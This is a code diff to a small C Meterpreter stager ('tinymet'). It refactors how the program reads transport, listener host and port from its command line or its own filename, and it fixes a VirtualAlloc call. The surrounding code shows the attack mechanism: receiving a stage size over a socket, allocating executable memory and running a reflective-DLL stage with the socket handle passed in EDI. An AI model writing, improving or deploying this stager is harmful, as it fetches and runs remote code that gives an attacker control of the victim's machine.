@@ -149,7 +149,7 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 	// So, we read first 4 bytes to use it for memory allocation calculations 
 	recv(buffer_socket, (char*)&bufsize, 4, 0); // read first 4 bytes = stage size
 	
-	buf = (unsigned char*)VirtualAlloc(buf, bufsize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	buf = (unsigned char*)VirtualAlloc(NULL, bufsize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	
 	// Q: why did we allocate bufsize+5? what's those extra 5 bytes?
 	// A: the stage is a large shellcode "ReflectiveDll", and when the stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER IN _EDI_ register.
@@ -267,6 +267,46 @@ char* wchar_to_char(wchar_t* orig){
 	return nstring;
 };
 
+void parse_args_from_cl(const wchar_t* args) {
+
+	wchar_t* filename;
+	wchar_t* firstunderscore;
+	wchar_t* lastunderscore;
+	wchar_t* lastdot;
+
+	filename = wcsrchr(arglist[0], '\\');	// Aargh! (under remarks, note) https://msdn.microsoft.com/en-us/library/windows/desktop/ms683156(v=vs.85).aspx
+											// Program behaves different if being debugged, sometimes the arglist[0] has full path, and sometimes it will be just the name :/
+											// COUNTLESS hours spent trying to find the issue (not that much, but annoying as hell)
+	if (!filename) {
+		filename = arglist[0];
+	}
+	else {
+		filename = filename + 1;
+	}
+
+	lastdot = wcsrchr(filename, '.');	// get last . before .exe extension
+	*lastdot = L'\0';					// now we null-terminated filename string at last dot, effectively removing extension
+										// now filename is going to be a plain "0_host.com_port"
+
+	firstunderscore = wcschr(filename, '_'); // == NULL if no underscores at all in filename
+	if (!firstunderscore) {
+		printf(helptext);
+		exit(-1);
+	}
+	*firstunderscore = L'\0'; // now we can parse the transport, null terminated "0[NULL]host.com_80"
+	TRANSPORT = wchar_to_char(filename);
+
+	lastunderscore = wcschr(firstunderscore + 1, '_'); // == NULL if there's no OTHER underscore after the first one
+	if (!lastunderscore) { // no _ and argscount == 1?
+		printf(helptext);
+		exit(-1);
+	}
+	*lastunderscore = L'\0'; // now we can parse the LHOST, null terminated "0[NULL]host.com[NULL]80"
+	LHOST = wchar_to_char(firstunderscore + 1);
+
+	LPORT = wchar_to_char(lastunderscore + 1); // :)
+}
+
 int main()
 {
 	int argsCount;
@@ -278,19 +318,13 @@ int main()
 		err_exit("CommandLineToArgvW & GetCommandLineW");
 	}
 
-	// looking for help?
-	if (argsCount == 2 && !wcscmp(arglist[1], L"--help")) { 
-		printf(helptext);
-		exit(-1);
-	}
-
 	/* PARSING ARGUMENTS */
 	/*
 	Now, we start parsing arguments "transport, lport and lhost";
 	TL;DR version: if argscount is 4, parse from command line, if it's one and there're two underscores in filename, get from filename.
 	
 	Longer version:
-	We have two options:
+	We have two options to determine transport, lhost and lport:
 	1) they're passed as command line arguments "tinymet.exe 0 host.com 80"; in this case argscount == 4
 	2) they're parsed from the filename "0_host.com_80.exe"; in this case:
 		2.a) argscount == 1, AND
@@ -306,40 +340,18 @@ int main()
 		LPORT = wchar_to_char(arglist[3]);
 	}
 
-	// Case 2: "0_host.com_80.exe"
+	// Case 2: maybe "1_host.com_80.exe", then parse, or simply "tinymet.exe" then print_help and exit.
 	else if (argsCount == 1) {
-		wchar_t* filename;
-		wchar_t* firstunderscore;
-		wchar_t* lastunderscore;
-		wchar_t* lastdot;
-
-		filename = arglist[0]; // that's gonna be the full path of the filename "drive:\\path\\0_host.com_port.exe"
-		filename = wcsrchr(filename, '\\') + 1; // now we removed the path, and left only with the filename "0_host.com_port.exe"
-
-		lastdot = wcsrchr(filename, '.');	// get last . before .exe extension
-		*lastdot = '\0';					// now we null-terminated filename string at last dot, effectively removing extension
-											// now filename is going to be "0_host.com_port"
-
-		firstunderscore = wcschr(filename, '_'); // == NULL if no underscores at all in filename
-		if (!firstunderscore) {
-			printf(helptext);
-			exit(-1);
-		}
-
-		lastunderscore = wcschr(firstunderscore + 1, '_'); // == NULL if there's no OTHER underscore after the first one
-		if (!lastunderscore) { // no _ and argscount == 1?
-			printf(helptext);
-			exit(-1);
-		}
-		// Case 3: something else ...
-		else {
-			printf(helptext);
-			exit(-1);
-		}
-
-
+		parse_args_from_cl(arglist[0]); // that arglist[0] is freakin' stupid ... sometimes it has the path, and sometimes it's the file without path
 	}
 
+	// you have no idea how this thing works
+	else {
+		printf(helptext);
+		exit(-1);
+	}
+
+	// by now, the program either exited because of error, or all args are parsed ...
 	printf("T:%s H:%s P:%s\n", TRANSPORT, LHOST, LPORT);
 
 	// pick transport ...
